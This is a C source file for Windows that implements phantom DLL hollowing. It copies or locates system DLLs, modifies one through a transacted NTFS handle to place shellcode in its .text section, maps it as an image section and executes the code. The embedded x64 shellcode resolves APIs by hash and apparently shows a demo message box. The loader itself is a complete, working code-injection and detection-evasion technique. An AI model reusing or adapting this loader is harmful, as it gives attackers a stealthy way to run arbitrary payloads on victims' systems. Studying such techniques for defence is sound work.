// ReSharper disable CppClangTidyClangDiagnosticFormatNonIso
// ReSharper disable CppClangTidyClangDiagnosticFormatPedantic
#include <Windows.h>
#include <stdio.h>
#include <stdint.h>
#include <winternl.h>
#include <versionhelpers.h>

//
// Definitions
//

typedef LONG(__stdcall* NTCREATESECTION)(HANDLE*, ULONG, void*, LARGE_INTEGER*, ULONG, ULONG, HANDLE);
typedef LONG(__stdcall* NTMAPVIEWOFSECTION)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS(__stdcall* NTCREATETRANSACTION)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, LPGUID, HANDLE, ULONG, ULONG, ULONG, PLARGE_INTEGER, PUNICODE_STRING);

BOOL CheckRelocRange(PBYTE pRelocBuf, UINT dwStartRVA, UINT dwEndRVA);
PVOID GetPAFromRVA(PBYTE pPeBuf, IMAGE_NT_HEADERS* pNtHdrs, IMAGE_SECTION_HEADER* pInitialSectHdrs, UINT64 qwRVA);

//
// Hollower logic
//

BOOL HollowDll(PBYTE* ppMapBuf, UINT64* pqwMapBufSize, const PBYTE pCodeBuf, const UINT dwReqBufSize, 
			   PBYTE* ppMappedCode, const BOOL bTxF, const BOOL bIsElevated) {
	WIN32_FIND_DATAW		wfd = { 0 };
	WCHAR					cSearchFilePath[MAX_PATH] = { 0 };
	WCHAR					cTempPath[MAX_PATH] = { 0 };
	WCHAR					cDllPath[MAX_PATH] = { 0 };
	WCHAR					cDllDestPath[MAX_PATH] = { 0 };
	WCHAR					cSysDir[MAX_PATH] = { 0 };
	HANDLE					hFind;
	BOOL					bMapped = FALSE;
	
	// Function pointers
	NTCREATESECTION			pNtCreateSection = NULL;
	NTMAPVIEWOFSECTION		pNtMapViewOfSection = NULL;
	NTCREATETRANSACTION		pNtCreateTransaction = NULL;

	//
	// Load required functions from ntdll
	//
	
	const HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
	pNtCreateSection = (NTCREATESECTION)GetProcAddress(hNtdll, "NtCreateSection");
	pNtMapViewOfSection = (NTMAPVIEWOFSECTION)GetProcAddress(hNtdll, "NtMapViewOfSection");
	pNtCreateTransaction = (NTCREATETRANSACTION)GetProcAddress(hNtdll, "NtCreateTransaction");

	//
	// Locate a DLL in the architecture appropriate system folder which has a sufficient image size to hollow for allocation.
	//

	GetSystemDirectoryW(cSysDir, MAX_PATH);
	wcscat_s(cSearchFilePath, MAX_PATH, cSysDir);
	wcscat_s(cSearchFilePath, MAX_PATH, L"\\*.dll");

	// TODO: implement copying in main loop. So dll gets copied one by one instead of all at once to prevent unnecessary dll's to be copied.
	if (!bIsElevated) {
		if (!GetTempPathW(MAX_PATH, cTempPath)) {
			puts("[-] Unable to get temporary path.\r\n");
			return FALSE;
		}

		if ((hFind = FindFirstFileW(cSearchFilePath, &wfd)) != INVALID_HANDLE_VALUE) {
			do {
				// Get path of source
				wcscat_s(cDllPath, MAX_PATH, cSysDir);
				wcscat_s(cDllPath, MAX_PATH, L"\\");
				wcscat_s(cDllPath, MAX_PATH, wfd.cFileName);
				// Get path of destination
				wcscat_s(cDllDestPath, MAX_PATH, cTempPath);
				wcscat_s(cDllDestPath, MAX_PATH, wfd.cFileName);

				if (CopyFileW(cDllPath, cDllDestPath, TRUE)) {  // TODO: replace with syscall
					printf("[+] Copied %ls to %ls\r\n", cDllPath, cDllDestPath);
				}
				
				// Cleanup
				SecureZeroMemory(cDllPath, MAX_PATH);
				SecureZeroMemory(cDllDestPath, MAX_PATH);
			} while (FindNextFileW(hFind, &wfd));
		}

		// Set path to tmp folder
		SecureZeroMemory(cSearchFilePath, MAX_PATH);
		wcscat_s(cSearchFilePath, MAX_PATH, cTempPath);
		wcscat_s(cSearchFilePath, MAX_PATH, L"*.dll");
	}
	
	if ((hFind = FindFirstFileW(cSearchFilePath, &wfd)) != INVALID_HANDLE_VALUE) {
		do {
			if (GetModuleHandleW(wfd.cFileName) == NULL) {
				HANDLE		hFile = INVALID_HANDLE_VALUE;
				HANDLE		hTransaction = INVALID_HANDLE_VALUE;
				WCHAR		cFilePath[MAX_PATH];
				NTSTATUS	ntStatus;
				PBYTE		pFileBuf;

				if (bIsElevated) {
					GetSystemDirectoryW(cFilePath, MAX_PATH);
					wcscat_s(cFilePath, MAX_PATH, L"\\");
				}
				else {
					GetTempPathW(MAX_PATH, cFilePath);
				}
				wcscat_s(cFilePath, MAX_PATH, wfd.cFileName);

				//
				// Read the DLL to memory and check its headers to identify its image size.
				//

				if (bTxF) {
					OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };

					ntStatus = pNtCreateTransaction(&hTransaction,
						TRANSACTION_ALL_ACCESS,
						&objAttr,
						NULL,
						NULL,
						0,
						0,
						0,
						NULL,
						NULL);

					if (NT_SUCCESS(ntStatus)) {
						hFile = CreateFileTransactedW(cFilePath,
							GENERIC_WRITE | GENERIC_READ,
							0,
							NULL,
							OPEN_EXISTING,
							FILE_ATTRIBUTE_NORMAL,
							NULL,
							hTransaction,
							NULL,
							NULL);
					}
					else {
						printf("[-] Failed to create transaction (error 0x%lx)\r\n", ntStatus);
					}
				}
				else {
					hFile = CreateFileW(cFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);  // TODO: replace with syscall
				}

				if (hFile != INVALID_HANDLE_VALUE) {
					const UINT dwFileSize = GetFileSize(hFile, NULL);
					UINT dwBytesRead = 0;

					pFileBuf = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT, PAGE_READWRITE);

					if (ReadFile(hFile, pFileBuf, dwFileSize, (PDWORD)&dwBytesRead, NULL)) {
						SetFilePointer(hFile, 0, NULL, FILE_BEGIN);

						IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pFileBuf;
						IMAGE_NT_HEADERS* pNtHdrs = (IMAGE_NT_HEADERS*)(pFileBuf + pDosHdr->e_lfanew);
						IMAGE_SECTION_HEADER* pSectHdrs = (IMAGE_SECTION_HEADER*)((PBYTE)&pNtHdrs->OptionalHeader + sizeof(IMAGE_OPTIONAL_HEADER));

						if (pNtHdrs->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR_MAGIC) {
							if (dwReqBufSize < pNtHdrs->OptionalHeader.SizeOfImage && (_stricmp((char*)pSectHdrs->Name, ".text") == 0 && dwReqBufSize < pSectHdrs->Misc.VirtualSize)) {
								//
								// Found a DLL with sufficient image size: map an image view of it for hollowing.
								//

								printf("[*] %ws - image size: %lu - .text size: %lu\r\n", wfd.cFileName, pNtHdrs->OptionalHeader.SizeOfImage, pSectHdrs->Misc.VirtualSize);

								BOOL bTxF_Valid = FALSE;
								UINT dwCodeRva = 0;

								if (bTxF) {
									//
									// For TxF, make the modifications to the file contents now prior to mapping.
									//

									UINT dwBytesWritten = 0;

									//
									// Wipe the data directories that conflict with the code section
									//

									for (UINT dwX = 0; dwX < pNtHdrs->OptionalHeader.NumberOfRvaAndSizes; dwX++) {
										if (pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress >= pSectHdrs->VirtualAddress && pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress < (pSectHdrs->VirtualAddress + pSectHdrs->Misc.VirtualSize)) {
											pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress = 0;
											pNtHdrs->OptionalHeader.DataDirectory[dwX].Size = 0;
										}
									}

									//
									// Find a range free of relocations large enough to accomodate the code.
									//

									BOOL bRangeFound = FALSE;
									PBYTE pRelocBuf = (PBYTE)GetPAFromRVA(pFileBuf, pNtHdrs, pSectHdrs, pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

									if (pRelocBuf != NULL) {
										for (dwCodeRva = 0; !bRangeFound && dwCodeRva < pSectHdrs->Misc.VirtualSize; dwCodeRva += dwReqBufSize) {
											if (!CheckRelocRange(pRelocBuf, pSectHdrs->VirtualAddress + dwCodeRva, pSectHdrs->VirtualAddress + dwCodeRva + dwReqBufSize)) {
												bRangeFound = TRUE;
												break;
											}
										}

										if (bRangeFound) {
											printf("[+] Found a blank region with code section to accomodate payload at 0x%08x\r\n", dwCodeRva);
										}
										else {
											printf("[-] Failed to identify a blank region large enough to accomodate payload\r\n");
										}

										memcpy(pFileBuf + pSectHdrs->PointerToRawData + dwCodeRva, pCodeBuf, dwReqBufSize);

										if (WriteFile(hFile, pFileBuf, dwFileSize, (PDWORD)&dwBytesWritten, NULL)) {
											printf("[+] Successfully modified TxF file content.\r\n");
											bTxF_Valid = TRUE;
										}
									}
									else {
										printf("[-] No relocation directory present.\r\n");
									}
								}

								if (!bTxF || bTxF_Valid) {
									HANDLE hSection = NULL;
									ntStatus = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);

									if (NT_SUCCESS(ntStatus)) {
										*pqwMapBufSize = 0; // The map view is an in and out parameter, if it isn't zero the map may have its size overwritten
										ntStatus = pNtMapViewOfSection(hSection, GetCurrentProcess(), (void**)ppMapBuf, 0, 0, NULL, (PSIZE_T)pqwMapBufSize, 1, 0, PAGE_READONLY); // AllocationType of MEM_COMMIT|MEM_RESERVE is not needed for SEC_IMAGE.

										if (NT_SUCCESS(ntStatus)) {
											if (*pqwMapBufSize >= pNtHdrs->OptionalHeader.SizeOfImage) { // Verify that the mapped size is of sufficient size. There are quirks to image mapping that can result in the image size not matching the mapped size.
												printf("[*] %ws - mapped size: %I64u\r\n", wfd.cFileName, *pqwMapBufSize);
												*ppMappedCode = *ppMapBuf + pSectHdrs->VirtualAddress + dwCodeRva;

												if (!bTxF) {
													UINT dwOldProtect = 0;

													if (VirtualProtect(*ppMappedCode, dwReqBufSize, PAGE_READWRITE, (PDWORD)&dwOldProtect)) {
														memcpy(*ppMappedCode, pCodeBuf, dwReqBufSize);

														if (VirtualProtect(*ppMappedCode, dwReqBufSize, dwOldProtect, (PDWORD)&dwOldProtect)) {
															bMapped = TRUE;
														}
													}
												}
												else {
													bMapped = TRUE;
												}
											}
										}
										else {
											printf("[-] Failed to create mapping of section (error 0x%08lx)", ntStatus);
										}
									}
									else {
										printf("[-] Failed to create section (error 0x%lx)\r\n", ntStatus);
									}
								}
								else {
									printf("[-] TxF initialization failed.\r\n");
								}
							}
						}
					}

					if (pFileBuf != NULL) {
						VirtualFree(pFileBuf, 0, MEM_RELEASE);
					}

					if (hFile != INVALID_HANDLE_VALUE) {
						CloseHandle(hFile);
					}

					if (hTransaction != INVALID_HANDLE_VALUE) {
						CloseHandle(hTransaction);
					}
				}
				else {
					printf("[-] Failed to open handle to %ws (error %lu)\r\n", cFilePath, GetLastError());
				}
			}
		} while (!bMapped && FindNextFileW(hFind, &wfd));

		FindClose(hFind);
	}

	return bMapped;
}

//
// Helpers
//

IMAGE_SECTION_HEADER* GetContainerSectHdr(IMAGE_NT_HEADERS* pNtHdrs, IMAGE_SECTION_HEADER* pInitialSectHeader, UINT64 qwRVA) {
	for (UINT dwX = 0; dwX < pNtHdrs->FileHeader.NumberOfSections; dwX++) {
		IMAGE_SECTION_HEADER* pCurrentSectHdr = pInitialSectHeader;
		UINT dwCurrentSectSize;

		pCurrentSectHdr += dwX;

		if (pCurrentSectHdr->Misc.VirtualSize > pCurrentSectHdr->SizeOfRawData) {
			dwCurrentSectSize = pCurrentSectHdr->Misc.VirtualSize;
		}
		else {
			dwCurrentSectSize = pCurrentSectHdr->SizeOfRawData;
		}

		if ((qwRVA >= pCurrentSectHdr->VirtualAddress) && (qwRVA <= (pCurrentSectHdr->VirtualAddress + dwCurrentSectSize))) {
			return pCurrentSectHdr;
		}
	}

	return NULL;
}

PVOID GetPAFromRVA(PBYTE pPeBuf, IMAGE_NT_HEADERS* pNtHdrs, IMAGE_SECTION_HEADER* pInitialSectHdrs, UINT64 qwRVA) {
	IMAGE_SECTION_HEADER* pContainSectHdr;

	if ((pContainSectHdr = GetContainerSectHdr(pNtHdrs, pInitialSectHdrs, qwRVA)) != NULL) {
		const UINT dwOffset = (qwRVA - pContainSectHdr->VirtualAddress);

		if (dwOffset < pContainSectHdr->SizeOfRawData)
		{
			// Sections can be partially or fully virtual. Avoid creating physical pointers that reference regions outside of the raw data in sections with a greater virtual size than physical.
			return (PBYTE)(pPeBuf + pContainSectHdr->PointerToRawData + dwOffset);
		}
	}

	return NULL;
}

BOOL CheckRelocRange(PBYTE pRelocBuf, UINT dwStartRVA, UINT dwEndRVA) {
	IMAGE_BASE_RELOCATION* pCurrentRelocBlock;
	UINT dwRelocBufOffset, dwX;
	BOOL bWithinRange = FALSE;

	for (pCurrentRelocBlock = (IMAGE_BASE_RELOCATION*)pRelocBuf, dwX = 0, dwRelocBufOffset = 0; pCurrentRelocBlock->SizeOfBlock; dwX++) {
		const UINT dwNumBlocks = ((pCurrentRelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD));
		WORD* pwCurrentRelocEntry = (WORD*)((PBYTE)pCurrentRelocBlock + sizeof(IMAGE_BASE_RELOCATION));

		for (UINT dwY = 0; dwY < dwNumBlocks; dwY++, pwCurrentRelocEntry++) {
#ifdef _WIN64
#define RELOC_FLAG_ARCH_AGNOSTIC IMAGE_REL_BASED_DIR64
#else
#define RELOC_FLAG_ARCH_AGNOSTIC IMAGE_REL_BASED_HIGHLOW
#endif
			if (((*pwCurrentRelocEntry >> 12) & RELOC_FLAG_ARCH_AGNOSTIC) == RELOC_FLAG_ARCH_AGNOSTIC) {
				const UINT dwRelocEntryRefLocRva = (pCurrentRelocBlock->VirtualAddress + (*pwCurrentRelocEntry & 0x0FFF));

				if (dwRelocEntryRefLocRva >= dwStartRVA && dwRelocEntryRefLocRva < dwEndRVA) {
					bWithinRange = TRUE;
				}
			}
		}

		dwRelocBufOffset += pCurrentRelocBlock->SizeOfBlock;
		pCurrentRelocBlock = (IMAGE_BASE_RELOCATION*)((PBYTE)pCurrentRelocBlock + pCurrentRelocBlock->SizeOfBlock);
	}

	return bWithinRange;
}

//
// Entry point
//

typedef void(*fnAddr)(VOID);

INT main() {
	BOOL				bIsElevated = FALSE;
	BOOL				bTxF = TRUE;
	HANDLE				hProcessToken = NULL;
	PBYTE				pMapBuf = NULL;
	PBYTE				pMappedCode = NULL;
	UINT64				qwMapBufSize;
	
	BYTE				bMessageboxShellcode64[] = "\x48\x89\x5C\x24\x18\x48\x89\x7C\x24\x20\x55\x48\x8D\x6C\x24\xA9\x48\x81\xEC\xA0\x00\x00\x00\x33\xDB\xC7\x45\x17\x75\x00\x73\x00\xB9\x13\x9C\xBF\xBD\x48\x89\x5D\x67\x89\x5D\xFB\x89\x5D\x0B\x66\x89\x5D\x47\xC7\x45\x1B\x65\x00\x72\x00\xC7\x45\x1F\x33\x00\x32\x00\xC7\x45\x23\x2E\x00\x64\x00\xC7\x45\x27\x6C\x00\x6C\x00\xC7\x45\xD7\x4D\x65\x73\x73\xC7\x45\xDB\x61\x67\x65\x42\xC7\x45\xDF\x6F\x78\x57\x00\xC7\x45\x2F\x48\x00\x65\x00\xC7\x45\x33\x6C\x00\x6C\x00\xC7\x45\x37\x6F\x00\x20\x00\xC7\x45\x3B\x57\x00\x6F\x00\xC7\x45\x3F\x72\x00\x6C\x00\xC7\x45\x43\x64\x00\x21\x00\xC7\x45\xE7\x44\x00\x65\x00\xC7\x45\xEB\x6D\x00\x6F\x00\xC7\x45\xEF\x21\x00\x00\x00\xE8\x74\x00\x00\x00\xB9\xB5\x41\xD9\x5E\x48\x8B\xD8\xE8\x67\x00\x00\x00\x48\x8B\xF8\xC7\x45\xF7\x14\x00\x14\x00\x48\x8D\x45\x17\x33\xD2\x4C\x8D\x4D\x6F\x48\x89\x45\xFF\x4C\x8D\x45\xF7\x33\xC9\xFF\xD3\x48\x8B\x4D\x6F\x48\x8D\x45\xD7\x45\x33\xC0\x48\x89\x45\x0F\x4C\x8D\x4D\x67\xC7\x45\x07\x0C\x00\x0C\x00\x48\x8D\x55\x07\xFF\xD7\x45\x33\xC9\x4C\x8D\x45\xE7\x48\x8D\x55\x2F\x33\xC9\xFF\x55\x67\x4C\x8D\x9C\x24\xA0\x00\x00\x00\x49\x8B\x5B\x20\x49\x8B\x7B\x28\x49\x8B\xE3\x5D\xC3\xCC\xCC\x48\x8B\xC4\x48\x89\x58\x08\x48\x89\x68\x10\x48\x89\x70\x18\x48\x89\x78\x20\x41\x56\x48\x83\xEC\x10\x65\x48\x8B\x04\x25\x60\x00\x00\x00\x8B\xE9\x45\x33\xF6\x48\x8B\x50\x18\x4C\x8B\x4A\x10\x4D\x8B\x41\x30\x4D\x85\xC0\x0F\x84\xB3\x00\x00\x00\x41\x0F\x10\x41\x58\x49\x63\x40\x3C\x41\x8B\xD6\x4D\x8B\x09\xF3\x0F\x7F\x04\x24\x46\x8B\x9C\x00\x88\x00\x00\x00\x45\x85\xDB\x74\xD2\x48\x8B\x04\x24\x48\xC1\xE8\x10\x66\x44\x3B\xF0\x73\x22\x48\x8B\x4C\x24\x08\x44\x0F\xB7\xD0\x0F\xBE\x01\xC1\xCA\x0D\x80\x39\x61\x7C\x03\x83\xC2\xE0\x03\xD0\x48\xFF\xC1\x49\x83\xEA\x01\x75\xE7\x4F\x8D\x14\x18\x45\x8B\xDE\x41\x8B\x7A\x20\x49\x03\xF8\x45\x39\x72\x18\x76\x8E\x8B\x37\x41\x8B\xDE\x49\x03\xF0\x48\x8D\x7F\x04\x0F\xBE\x0E\x48\xFF\xC6\xC1\xCB\x0D\x03\xD9\x84\xC9\x75\xF1\x8D\x04\x13\x3B\xC5\x74\x0E\x41\xFF\xC3\x45\x3B\x5A\x18\x72\xD5\xE9\x5E\xFF\xFF\xFF\x41\x8B\x42\x24\x43\x8D\x0C\x1B\x49\x03\xC0\x0F\xB7\x14\x01\x41\x8B\x4A\x1C\x49\x03\xC8\x8B\x04\x91\x49\x03\xC0\xEB\x02\x33\xC0\x48\x8B\x5C\x24\x20\x48\x8B\x6C\x24\x28\x48\x8B\x74\x24\x30\x48\x8B\x7C\x24\x38\x48\x83\xC4\x10\x41\x5E\xC3";

	// Check if ran with elevated privileges
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hProcessToken)) {
		TOKEN_ELEVATION Elevation;
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hProcessToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			bIsElevated = Elevation.TokenIsElevated;
		}
	}
	if (hProcessToken) {
		CloseHandle(hProcessToken);
	}

	// Check if TxF is supported
	if (!IsWindowsVistaOrGreater()) {  // Does this really work
		puts("[*] TxF is not supported\r\n");
		bTxF = FALSE;
	}

	if (HollowDll(&pMapBuf, &qwMapBufSize, bMessageboxShellcode64, 
				  sizeof bMessageboxShellcode64, &pMappedCode, bTxF, bIsElevated)) {
		printf("[+] Successfully mapped an image to hollow at 0x%p (size: %I64u bytes)\r\n", (const PCHAR)pMapBuf, qwMapBufSize);
		printf("[*] Calling 0x%p...\r\n", (const PCHAR)pMappedCode);
		((fnAddr)pMappedCode)();
	}
}
